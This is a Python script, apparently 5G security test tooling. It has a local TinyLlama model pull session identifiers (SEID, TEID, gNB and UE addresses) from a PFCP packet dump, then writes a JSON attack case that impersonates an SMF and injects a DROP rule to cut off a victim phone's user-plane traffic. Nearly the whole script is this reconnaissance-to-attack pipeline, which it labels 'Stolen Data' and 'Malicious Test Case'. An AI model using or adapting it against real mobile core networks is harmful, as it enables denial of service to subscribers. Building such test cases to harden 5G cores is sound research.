import json
import os
import sys
import time
import requests
from pprint import pprint

# --- CONFIGURATION ---
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[!] Warning: 'requests' library not found. Please install it: pip install requests")

# Hardcoded Configuration
DEFAULT_OLLAMA_URL = "http://localhost:11434/api/chat"
DEFAULT_OLLAMA_MODEL = "tinyllama"

# --- LLM FUNCTION ---
def call_ollama(prompt, system_message, model=DEFAULT_OLLAMA_MODEL):
    if not REQUESTS_AVAILABLE: return None
    try:
        # We merge system message into the user prompt for TinyLlama stability
        full_prompt = f"{system_message}\n\n{prompt}"
        
        payload = {
            "model": model,
            "messages": [
                {"role": "user", "content": full_prompt}
            ],
            "stream": False,
            "options": {
                "temperature": 0.1, # Strict creativity
                "num_ctx": 4096,    # Context window
                "top_p": 0.5        # Focus on probable answers
            }
        }
        
        print(f"[*] Querying Ollama ({model})... This may take a few minutes.")
        response = requests.post(DEFAULT_OLLAMA_URL, json=payload, timeout=600)
        response.raise_for_status()
        return response.json().get("message", {}).get("content", "").strip()
    except Exception as e:
        print(f"[!] Ollama Connection Error: {e}")
        return None

# --- TEXT PRE-PROCESSING ---
def smart_filter_packets(full_dump):
    """
    Extracts relevant chunks to keep the LLM focused.
    """
    filtered_text = ""
    
    # 1. Find Frame 101 (Request)
    start_101 = full_dump.find("Frame 101")
    if start_101 == -1: start_101 = full_dump.find("Session Establishment Request")
    
    if start_101 != -1:
        chunk = full_dump[start_101:start_101+1500] # Reduced chunk size
        filtered_text += f"--- PACKET 1: UE IP SOURCE ---\n{chunk}\n\n"

    # 2. Find Frame 102 (Response) - CRITICAL
    start_102 = full_dump.find("Frame 102")
    if start_102 == -1: start_102 = full_dump.find("Session Establishment Response")
    
    if start_102 != -1:
        chunk = full_dump[start_102:start_102+1500] # Reduced chunk size
        filtered_text += f"--- PACKET 2: UPF ID SOURCE ---\n{chunk}\n\n"
        
    if not filtered_text:
        # Fallback
        return full_dump[:3000]
        
    return filtered_text

# --- MAIN LOGIC ---

def extract_session_data(packet_dump, model):
    
    optimized_dump = smart_filter_packets(packet_dump)
    print(f"[-] Input reduced to {len(optimized_dump)} characters.")

    # We provide the JSON structure inside the prompt
    target_json_str = json.dumps({
        "upf_ip": "IP_ADDRESS_HERE",            
        "victim_teid": "HEX_TEID_HERE",             
        "upf_seid": "HEX_SEID_HERE",                
        "victim_gnb_ip": "IP_ADDRESS_HERE",     
        "target_ue_ip": "IP_ADDRESS_HERE",      
        "attacker_ip": "192.168.37.131"
    })

    # STRICT PROMPT FOR TINYLLAMA
    system_msg = "You are a data extractor. You do not explain. You only output JSON."

    prompt = f"""### Instruction:
Analyze the network packet text below.
Extract the following fields into a JSON object:
1. "upf_ip": Source IP Address from Packet 2 (Response).
2. "upf_seid": The SEID found in Packet 2 (Response).
3. "victim_teid": The TEID found in 'Created PDR' -> 'F-TEID' in Packet 2.
4. "victim_gnb_ip": The IPv4 Address found in 'Created PDR' -> 'F-TEID' in Packet 2.
5. "target_ue_ip": The 'UE IP Address' found in Packet 1 (Request).

Use this exact JSON format:
{target_json_str}

### Input Data:
{optimized_dump}

### Response:
```json
"""

    response = call_ollama(prompt, system_msg, model)

    if not response: return None

    try:
        # Clean up Markdown formatting often returned by LLMs
        clean_response = response.replace("```json", "").replace("```", "").strip()
        
        start = clean_response.find('{')
        end = clean_response.rfind('}') + 1
        if start != -1 and end != -1:
            clean_json = clean_response[start:end]
            return json.loads(clean_json)
        else:
            print("[!] Could not find JSON brackets in LLM response.")
            print(f"Raw Output: {response}")
    except Exception as e:
        print(f"[!] JSON Parsing Failed: {e}")
        print(f"Raw Output: {response}")
    return None

def generate_attack_json(recon_data):
    try:
        def clean_id(val):
            # Normalization helper
            if isinstance(val, int): return val
            if isinstance(val, str):
                val = val.strip().lower().replace("0x", "")
                try: return int(val, 16)
                except: return 0
            return 0

        attacker_ip = recon_data.get("attacker_ip", "192.168.37.131")
        upf_ip = recon_data.get("upf_ip", "")

        # --- STEP 1: ASSOCIATION ---
        step1 = {
            "step": 1,
            "name": "Establish Fake SMF Association",
            "packet_type": "PFCP Association Setup Request",
            "transport_layer": {
                "src_ip": attacker_ip,
                "dst_ip": upf_ip,
                "protocol": "UDP", "port": 8805
            },
            "pfcp_header": {
                "version": 1, "type": 5, "seq_num": 0, "s_field": 0
            },
            "payload_ies": {
                "node_id": {"type": "IPv4", "value": attacker_ip},
                "recovery_timestamp": "now"
            }
        }

        # --- STEP 2: ATTACK ---
        step2 = {
            "step": 2,
            "name": "Inject Malicious Drop Rule",
            "packet_type": "PFCP Session Modification Request",
            "transport_layer": {
                "src_ip": attacker_ip,
                "dst_ip": upf_ip,
                "protocol": "UDP", "port": 8805
            },
            "pfcp_header": {
                "version": 1, "type": 52, 
                "seid": clean_id(recon_data.get("upf_seid", 0)), 
                "seq_num": 3
            },
            "payload_ies": {
                "far": {"id": 100, "apply_action": "DROP", "apply_action_code": 1},
                "pdr": {
                    "id": 100, "precedence": 1,
                    "pdi": {
                        "source_interface": "Access",
                        "fteid": {
                            "teid": clean_id(recon_data.get("victim_teid", 0)),
                            "ipv4": recon_data.get("victim_gnb_ip", "")
                        },
                        "ue_ip": recon_data.get("target_ue_ip", "")
                    }
                }
            }
        }

        return {
            "scenario": "Scenario 3: Fake SMF Access to UPF",
            "execution_flow": [step1, step2]
        }

    except Exception as e:
        print(f"[!] Error building attack case: {e}")
        return None

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--file", required=True)
    parser.add_argument("--model", default=DEFAULT_OLLAMA_MODEL)
    args = parser.parse_args()

    if not os.path.exists(args.file):
        print(f"[!] File not found: {args.file}")
        return

    print(f"[-] Reading {args.file}...")
    with open(args.file, 'r', encoding='utf-8', errors='ignore') as f:
        dump_data = f.read()

    recon_data = extract_session_data(dump_data, args.model)
    if not recon_data: 
        print("[!] Extraction failed.")
        return

    print("\n[+] Reconnaissance Successful! Stolen Data:")
    pprint(recon_data)

    attack_json = generate_attack_json(recon_data)
    
    if attack_json:
        ts = time.strftime("%Y%m%d_%H%M%S")
        outfile = f"scenario3_attack_std_{ts}.json"
        with open(outfile, 'w') as f:
            json.dump(attack_json, f, indent=4)
            
        print(f"\n[+] Malicious Test Case generated: {outfile}")
        print("[+] You can now run 'compare_json_files.py' against this file.")

if __name__ == "__main__":
    main()